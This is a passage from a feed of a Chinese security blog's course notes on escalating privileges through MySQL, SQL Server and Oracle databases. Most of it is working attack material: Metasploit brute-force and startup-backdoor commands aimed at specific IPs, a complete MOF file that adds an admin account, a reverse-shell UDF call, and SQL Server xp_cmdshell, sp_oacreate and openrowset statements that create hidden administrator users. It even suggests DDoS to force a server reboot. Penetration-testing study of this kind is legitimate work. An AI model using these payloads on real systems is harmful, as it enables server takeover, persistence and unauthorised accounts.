class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search mysql</span><br><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br><span class="line">show options</span><br><span class="line">set rhost 47.99.71.28</span><br><span class="line">set username root</span><br><span class="line">set pass_file /opt/mysql_pwd.txt</span><br><span class="line">show options</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-11.png" alt="60-11"></p><p>&lt;2&gt;数据库不支持外联，使用脚本在服务器本地暴力猜解。</p><p>网上搜了一个PHP版Mysql爆破小脚本，成功爆破出密码。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-12.png" alt="60-12"></p><p>参考：<a href="http://www.zzvips.com/article/79791.html">http://www.zzvips.com/article/79791.html</a></p><p>3、提权利用</p><p>3.1 UPF提权</p><p>我们优先选择使用UDF提权。</p><p>&lt;1&gt;获取mysql版本，确定导出目录。</p><p>mysql版本不同，UDF导出目录也会有所不同。</p><ul><li>1.mysql&lt;5.1 导出到c:&#x2F;windows或system32目录</li><li>2.mysql&gt;&#x3D;5.1 导出到安装目录&#x2F;lib&#x2F;plugin（mysql初始安装时，plugin目录默认不存在）。</li></ul><p>如下图，执行select version();语句，获取mysql版本为5.5.53。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-13.png" alt="60-13"></p><p>如下图，执行select @@basedir;语句，获取mysql的安装路径。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-14.png" alt="60-14"></p><p>可以直接进入安装目录&#x2F;lib&#x2F;下查看plugin是否存在（或者执行show variables like ‘%plugin%’;语句查看）</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-15.png" alt="60-15"></p><p>如果plugin目录不存在，需要手工创建plugin目录或利用NTFS流创建。</p><p>&lt;2&gt;利用自定义执行函数导出dll文件进行命令执行</p><p>在工具上，点击mysql提权进入配置页面，输入用户名密码，将可加载路径改为plugin下，后面的mysqlDLL.dll不变，点击安装DLL。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-16.png" alt="60-16"></p><p>这个工具总是安装失败。试了好几次，都失败了。</p><p>换个工具试试</p><p>首先root连接</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-17.png" alt="60-17"></p><p>这个工具有个好处就是会自动帮你把plugin目录写上去，所以我们直接点击导出udf即可。如下图，导出成功。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-18.png" alt="60-18"></p><p>然后使用自带命令创建cmdshell即可。如下图所示，创建成功。（如果创建失败的话，可以重启环境试试。失败原因猜测是集成在PHPstudy中的mysql问题）</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-19.png" alt="60-19"></p><p>接下来就可以 查看用户、查看权限、查看端口等。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-20.png" alt="60-20"></p><p>后续还可以添加账户名密码，连接它的远程端口来实现控制服务器的目的。常用命令如下</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-21.png" alt="60-21"></p><p>简单来说，这个工具原理就是执行如下语句。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-22.png" alt="60-22"></p><p>总结一下，UDF为User Defined  Function用户自定义函数，也就是支持用户自定义函数的功能。这里的自定义函数要以dll形式写成mysql的插件，提供给mysql来使用。也就是说我们可以通过编写dll文件来实现我们需要的功能。利用UDF提权需要知道root账户的密码，并且需要目标系统是Windows。可以使用现成的udf提权工具，也可以手工测试。</p><p>3.2 MOF提权（基于MySQL特性的安全问题）</p><p>导出自定义mof文件到系统目录加载</p><p><strong>mof提权的原理：</strong></p><p>mof是windows系统的一个文件（在c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。其就是用又了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p><p><strong>以下是mof提权的过程：</strong></p><p>将mof上传至任意可读可写目录下，这里我传到C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;目录下，命名为user_add.mof。</p><p>然后使用sql语句将系统当中默认的nullevt.mof给替换掉。进而让系统执行我们这个恶意的mof文件。</p><p>替换的sql语句：select load_file(‘C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;user_add.mof’) into dumpfile ‘c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof’;</p><p>mof文件代码如下所示：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span></span><br><span class="line"></span><br><span class="line">instance of __EventFilter as <span class="variable">$EventFilter</span> </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>; </span><br><span class="line">    Name  = <span class="string">&quot;filtP2&quot;</span>; </span><br><span class="line">    Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span> </span><br><span class="line">            <span class="string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="string">&quot; &quot;</span> </span><br><span class="line">            <span class="string">&quot;And TargetInstance.Second = 5&quot;</span>; </span><br><span class="line">    QueryLanguage = <span class="string">&quot;WQL&quot;</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as <span class="variable">$Consumer</span> </span><br><span class="line">&#123; </span><br><span class="line">    Name = <span class="string">&quot;consPCSV2&quot;</span>; </span><br><span class="line">    ScriptingEngine = <span class="string">&quot;JScript&quot;</span>; </span><br><span class="line">    ScriptText = </span><br><span class="line">    <span class="string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="string">&quot;)\nWSH.run(\&quot;</span>net.exe user admin admin /add\<span class="string">&quot;)&quot;</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = <span class="variable">$Consumer</span>; </span><br><span class="line">    <span class="keyword">Filter</span> = <span class="variable">$EventFilter</span>; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可见其中是有一段添加用户的脚本。账号为admin 密码为admin</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-23.png" alt="60-23"></p><p>经过测试，这个方式成功率不高。</p><p>参考：<a href="https://www.cnblogs.com/xishaonian/p/6384535.html">https://www.cnblogs.com/xishaonian/p/6384535.html</a></p><p>3.3 启动项提权（基于配合操作系统自启动）</p><p>导出自定义可执行文件到启动目录配合重启执行</p><p>将创建好的后门或执行文件进行服务器启动项写入，配合重启执行！</p><p>演示案例</p><p>&lt;1&gt;如果mysql数据库没有开启外联，当我们拿到数据库最高权限后，可以执行SQL自行开启外联。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-24.png" alt="60-24"></p><p>&lt;2&gt;使用msf提权，相关命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search mysql</span><br><span class="line">use exploit/windows/mysql/mysql_start_UP</span><br><span class="line">show options</span><br><span class="line">set rhost 12.34.56.78</span><br><span class="line">set username root</span><br><span class="line">set password root</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>如下图所示，后门上传成功。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-25.png" alt="60-25"></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-26.png" alt="60-26"></p><p>&lt;3&gt;由于上传目录为启动目录，当服务器重启时，就会加载执行。那如何让服务器重启呢?一般就是DDS攻击。之后还可以使用Cobalt Strike渗透测试神器 继续。</p><p>3.4 反弹shell提权（基于利用反弹特性命令执行）</p><p>&lt;1&gt;首先，执行命令nc -l -p 5577监听端口</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-27.png" alt="60-27"></p><p>&lt;2&gt;用上面那个工具，点击 创建反弹函数，点击 执行。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-28.png" alt="60-28"></p><p>&lt;3&gt;输入自定义SQL语句：select backshell(‘你的IP’,5577)，点击 执行。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-29.png" alt="60-29"></p><p>&lt;4&gt;反弹成功。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-30.png" alt="60-30"></p><p>&lt;5&gt;可以执行命令试一下</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-31.png" alt="60-31"></p><p><strong>案例2：Mssql数据库提权演示-连接客户端</strong></p><p>环境准备：windows2008、SqlServer2008</p><p>流程：服务探针-信息收集-提权利用-获取权限</p><p>1、使用xp_cmdshell进行提权</p><p>&lt;1&gt;通过查看服务器配置文件得到sa账户密码为admin。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-32.png" alt="60-32"></p><p>&lt;2&gt;由于mssql默认支持外联，因为可以本地通过SqlServer2008客户端使用sa账户密码连接。Navicat也能连接，但是推荐用官方的。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-33.png" alt="60-33"></p><p>&lt;3&gt;启用xp_cmdshell。xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">启用：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"> </span><br><span class="line">关闭；</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1 ；</span><br><span class="line">reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;,0;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-34.png" alt="60-34"></p><p>&lt;4&gt;接下来，我们就可以执行任意命令了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行：</span><br><span class="line">EXEC master.dbo.xp_cmdshell &#x27;命令&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-35.png" alt="60-35"></p><p>&lt;5&gt;如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exex master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;,&#x27;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure><p>xp_cmdshell在数据库-系统数据库-master-可编程性-扩展存储过程-系统扩展存储过程目录下。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-36.png" alt="60-36"></p><p>2、使用sp_oacreate进行提权</p><p>主要是用来调用OLE对象，利用OLE对象的run方法执行系统命令。</p><p>&lt;1&gt;启用sp_oacreate</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">启用：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;,1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line"> </span><br><span class="line">关闭：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;,0;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-37.png" alt="60-37"></p><p>&lt;2&gt;执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">执行whoami查看权限：</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;C:\\1.txt&#x27;</span><br><span class="line"> </span><br><span class="line">添加用户：</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net user 123$ 123/add&#x27;</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net localgroup administrators 123$ /add&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-38.png" alt="60-38"></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-39.png" alt="60-39"></p><p>3、使用SqlServer沙盒提权</p><p>依次执行下列sql语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">--提权语句</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line"> </span><br><span class="line">-- 不开启的话在执行xp_regwrite会提示让我们开启</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;</span><br><span class="line"> </span><br><span class="line">--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</span><br><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br><span class="line"> </span><br><span class="line">--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</span><br><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;, &#x27;SandBoxMode&#x27;</span><br><span class="line"> </span><br><span class="line">--执行系统命令</span><br><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user margin margin /add&quot;)&#x27;)</span><br><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net localgroup administrators margin /add&quot;)&#x27;)</span><br><span class="line"> </span><br><span class="line">沙盒模式SandBoxMode参数含义（默认是2）</span><br><span class="line">`0`：在任何所有者中禁止启用安全模式</span><br><span class="line">`1`：为仅在允许范围内</span><br><span class="line">`2`：必须在access模式下</span><br><span class="line">`3`：完全开启</span><br><span class="line">openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。</span><br><span class="line"> </span><br><span class="line">--恢复配置（暂不执行）</span><br><span class="line">--exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,1;</span><br><span class="line">--exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,0;reconfigure;</span><br><span class="line">--exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure;</span><br></pre></td></tr></table></figure><p>成功创建用户。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-40.png" alt="60-40"></p><p>参考资料：https:blog.51cto.com&#x2F;11797152&#x2F;2411770</p><p><strong>案例3：Oracle数据库提权演示-自动化工具</strong></p><p>1、普通用户模式：</p><p>前提是拥有一个普通的Oracle连接账号。不需要DBA权限，可提权至DBA，并以Oracle实例运行的权限执行操作系统命令。</p><p>2、DBA用户模式：（自动化工具演示）</p><p>拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。</p><p>案例演示</p><p>&lt;1&gt;首先读取配置文件，获取到一个Oracle账号密码。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-41.png" alt="60-41"></p><p>&lt;2&gt;工具连接。若账号是普通账号，选择普通模式，若账号是DBA账号，选择DBA模式。然后输入数据库相关信息，点击连接。提示payload发送成功。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-42.png" alt="60-42"></p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-43.png" alt="60-43"></p><p>&lt;3&gt;提权成功，接下来可以任意执行命令了。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-44.png" alt="60-44"></p><p>也可以点击文件管理，操作文件。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-45.png" alt="60-45"></p><p>还可以反弹shell。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-46.png" alt="60-46"></p><p>&lt;4&gt;若没有账号密码，但是有注入点，还可以用这个工具的注入模式，进行注入提权。</p><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-47.png" alt="60-47"></p><p>3、注入提升模式：（sqlmap测试演示）</p><p>拥有一个Oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证。</p><p>说明：对于JSP网站，当前获取到它的网站权限后，不需要提权。因为它的网站权限就是系统权限，jsp自带system。因为一般Oracle数据库会和jsp搭配使用，所以当你拥有一个注入点时，你会发现，这个注入点本身就拥有system权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：sqlmap.py -u http://192.168.131.142:8080/sql.jsp?id-7698 --is-dba</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/60-48.png" alt="60-48"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;60：权限提升-MY&amp;amp;MS&amp;amp;ORA等SQL数据库提权&lt;/p&gt;</summary>
    
    
    
    <category term="小迪安全" scheme="http://blog.hvvl404.fun/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>58：权限提升-网站权限后台漏洞第三方获取</title>
    <link href="http://blog.hvvl404.fun/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/58%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/"/>
    <id>http://blog.hvvl404.fun/2023/06/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%89/58%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96/</id>
    <published>2023-06-05T14:27:20.000Z</published>
    <updated>2023-06-06T15:37:07.346Z</updated>
    
